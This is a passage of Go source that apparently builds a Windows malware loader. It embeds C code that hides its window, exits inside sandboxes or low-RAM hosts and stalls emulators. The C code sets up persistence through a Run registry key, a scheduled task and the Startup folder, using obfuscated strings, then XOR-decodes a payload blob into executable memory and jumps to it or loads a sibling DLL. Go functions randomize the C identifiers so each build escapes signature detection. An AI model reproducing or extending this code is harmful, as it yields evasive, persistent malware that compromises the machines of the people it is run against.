	RegSetValueExW(h, persist_name, 0, REG_SZ, (const BYTE *)self, (DWORD)((lstrlenW(self) + 1) * sizeof(wchar_t)));
	RegCloseKey(h);
}

static void persist_task(const wchar_t *self) {
	STARTUPINFOW si;
	PROCESS_INFORMATION pi;
	wchar_t cmd[1024], wfmt[128];
	char sch[16], fmt[96];
	ds(e_sch, (int)sizeof(e_sch), sch);
	ds(e_fmt, (int)sizeof(e_fmt), fmt);
	if (!MultiByteToWideChar(CP_UTF8, 0, fmt, -1, wfmt, 128)) return;
	wsprintfW(cmd, wfmt, sch, persist_name, self);
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = 0;
	if (CreateProcessW(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
		CloseHandle(pi.hThread);
		CloseHandle(pi.hProcess);
	}
}

static void persist_startup(const wchar_t *self) {
	wchar_t app[MAX_PATH], dst[MAX_PATH], wtmp[64];
	char tmp[32];
	DWORD n;
	ds(e_app, (int)sizeof(e_app), tmp);
	MultiByteToWideChar(CP_UTF8, 0, tmp, -1, wtmp, 64);
	n = GetEnvironmentVariableW(wtmp, app, MAX_PATH);
	if (!n || n >= MAX_PATH) return;
	lstrcpyW(dst, app);
	lstrcatW(dst, L"\\");
	ds(e_ms, (int)sizeof(e_ms), tmp);
	MultiByteToWideChar(CP_UTF8, 0, tmp, -1, wtmp, 64);
	lstrcatW(dst, wtmp);
	lstrcatW(dst, L"\\");
	ds(e_win, (int)sizeof(e_win), tmp);
	MultiByteToWideChar(CP_UTF8, 0, tmp, -1, wtmp, 64);
	lstrcatW(dst, wtmp);
	lstrcatW(dst, L"\\");
	ds(e_sm, (int)sizeof(e_sm), tmp);
	MultiByteToWideChar(CP_UTF8, 0, tmp, -1, wtmp, 64);
	lstrcatW(dst, wtmp);
	lstrcatW(dst, L"\\");
	ds(e_pr, (int)sizeof(e_pr), tmp);
	MultiByteToWideChar(CP_UTF8, 0, tmp, -1, wtmp, 64);
	lstrcatW(dst, wtmp);
	lstrcatW(dst, L"\\");
	ds(e_st, (int)sizeof(e_st), tmp);
	MultiByteToWideChar(CP_UTF8, 0, tmp, -1, wtmp, 64);
	lstrcatW(dst, wtmp);
	CreateDirectoryW(dst, NULL);
	lstrcatW(dst, L"\\");
	lstrcatW(dst, persist_name);
	lstrcatW(dst, L".exe");
	if (lstrcmpiW(dst, self) == 0) return;
	CopyFileW(self, dst, FALSE);
#if DISK_DLL
	copy_sibling(self, dst);
#endif
}

static void persist(void) {
	wchar_t self[MAX_PATH];
	if (method_is(e_off, (int)sizeof(e_off)) || sizeof(e_method) == 0) return;
	if (!GetModuleFileNameW(NULL, self, MAX_PATH)) return;
	if (method_is(e_rk, (int)sizeof(e_rk)) || method_all()) persist_run(self);
	if (method_is(e_tk, (int)sizeof(e_tk)) || method_all()) persist_task(self);
	if (method_is(e_ln, (int)sizeof(e_ln)) || method_all()) persist_startup(self);
}

#if !DISK_DLL
static void jump(void *code, void *stack) {
#if defined(__x86_64__)
	__asm__ volatile(
		"movq %%rdx, %%rsp\n\t"
		"andq $-16, %%rsp\n\t"
		"subq $40, %%rsp\n\t"
		"call *%%rcx\n\t"
		:
		: "c"(code), "d"(stack)
		: "memory", "cc", "rax", "r8", "r9", "r10", "r11");
#elif defined(__i386__)
	__asm__ volatile(
		"movl %1, %%esp\n\t"
		"andl $-16, %%esp\n\t"
		"call *%0\n\t"
		:
		: "r"(code), "r"(stack)
		: "memory", "cc");
#endif
}

static void run(void) {
	SIZE_T n = (SIZE_T)(blob_end - blob);
	SIZE_T page = 0x1000;
	SIZE_T reg = (n + page - 1) & ~(page - 1);
	LPVOID addr, st, stk;
	DWORD old = 0;
	unsigned char *dst;
	SIZE_T i, ks;
	if (n == 0) return;
	addr = VirtualAlloc(NULL, reg, MEM_RESERVE, PAGE_NOACCESS);
	if (!addr) {
		addr = VirtualAlloc(NULL, reg, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		if (!addr) {
			note("va");
			return;
		}
	} else if (!VirtualAlloc(addr, reg, MEM_COMMIT, PAGE_READWRITE)) {
		if (!VirtualProtect(addr, reg, PAGE_READWRITE, &old)) {
			note("va");
			return;
		}
	}
	dst = (unsigned char *)addr;
	ks = sizeof(xor_key);
	for (i = 0; i < n; i++) dst[i] = blob[i] ^ xor_key[i % ks];
	if (!VirtualProtect(addr, n, PAGE_EXECUTE_READWRITE, &old)) {
		note("vp");
		return;
	}
	FlushInstructionCache(GetCurrentProcess(), addr, n);
	st = VirtualAlloc(NULL, 8u << 20, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!st) {
		note("va");
		return;
	}
	stk = (char *)st + (8u << 20) - 256;
	if (lab_fast()) {
		((void (*)(void))addr)();
		return;
	}
	jump(addr, stk);
	note("ret");
	for (;;) Sleep(0xFFFFFFFFu);
}
#else
/* Working lab host shape (validated): LoadLibrary sibling DLL, resolve
 * export, CreateThread with a large stack, wait. Matches rundll32 /
 * mini_loader — avoids 0xc0000005 seen with -mwindows + direct call. */
static DWORD WINAPI disk_start(LPVOID p) {
	((void (*)(void))p)();
	return 0;
}

static void run(void) {
	wchar_t self[MAX_PATH], dll[MAX_PATH];
	char exp[64];
	HMODULE h;
	void (*entry)(void);
	HANDLE th;
	DWORD wait;
	if (!GetModuleFileNameW(NULL, self, MAX_PATH)) {
		note("ll");
		return;
	}
	sibling_dll_path(self, dll, MAX_PATH);
	h = LoadLibraryW(dll);
	if (!h) {
		note("ll");
		return;
	}
	ds(e_exp, (int)sizeof(e_exp), exp);
	entry = (void (*)(void))GetProcAddress(h, exp);
	if (!entry) {
		note("gp");
		return;
	}
	/* 8 MiB stack — Go c-shared runtime is heavy on first call. */
	th = CreateThread(NULL, 8u << 20, disk_start, (LPVOID)entry, STACK_SIZE_PARAM_IS_A_RESERVATION, NULL);
	if (!th) {
		th = CreateThread(NULL, 8u << 20, disk_start, (LPVOID)entry, 0, NULL);
	}
	if (!th) {
		note("ct");
		entry();
		if (lab_fast()) return;
		note("ret");
		for (;;) Sleep(0xFFFFFFFFu);
		return;
	}
	wait = lab_fast() ? 8000u : 0xFFFFFFFFu;
	WaitForSingleObject(th, wait);
	CloseHandle(th);
	if (lab_fast()) return;
	note("ret");
	for (;;) Sleep(0xFFFFFFFFu);
}
#endif

static int sliv_main(void) {
	(void)build_id;
	noise_keep = noise[0];
#if DISK_DLL
	/* DiskDLL host: stay close to the known-good mini loader. Skip
	 * emulator delay / sandbox exits that are unnecessary for MEM_IMAGE. */
	if (HIDE_CONSOLE) {
		HWND w = GetConsoleWindow();
		if (w) ShowWindow(w, SW_HIDE);
		FreeConsole();
	}
	persist();
	run();
	return 0;
#else
	hide_window();
	if (sandbox()) {
		note("box");
		ExitProcess(0);
	}
	if (!enough_ram()) {
		note("ram");
		ExitProcess(0);
	}
	pause_emu();
	persist();
	run();
	return 0;
#endif
}

int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d) {
	(void)a;
	(void)b;
	(void)c;
	(void)d;
	return sliv_main();
}

int main(void) { return sliv_main(); }
`
	return randomizeCIdents(src, []byte{k})
}

func randomizeCIdents(src string, seed []byte) string {
	names := []string{
		"persist_startup", "sibling_dll_path", "copy_sibling", "persist_task",
		"persist_run", "hide_window", "enough_ram", "pause_emu", "method_all",
		"method_is", "last_slash", "lab_fast", "sliv_main", "sandbox", "persist",
		"jump", "note", "run", "ds", "disk_start",
	}
	b := []byte(src)
	for _, n := range names {
		old := []byte(n)
		neu := morphIdent(old, seed)
		if bytes.Equal(old, neu) {
			continue
		}
		patchCIdent(b, old, neu)
	}
	return string(b)
}

func isCIdentChar(c byte) bool {
	return isWord(c) || c == '_'
}

func patchCIdent(buf, old, neu []byte) {
	if len(old) == 0 || len(old) != len(neu) {
		return
	}
	for i := 0; i+len(old) <= len(buf); {
		if !bytes.Equal(buf[i:i+len(old)], old) {
			i++
			continue
		}
		if i > 0 && isCIdentChar(buf[i-1]) {
			i++
			continue
		}
		if i+len(old) < len(buf) && isCIdentChar(buf[i+len(old)]) {
			i++
			continue
		}
		copy(buf[i:i+len(old)], neu)
		i += len(old)
	}
}

func bool01(v bool) string {
	if v {
		return "1"
	}
	return "0"
}
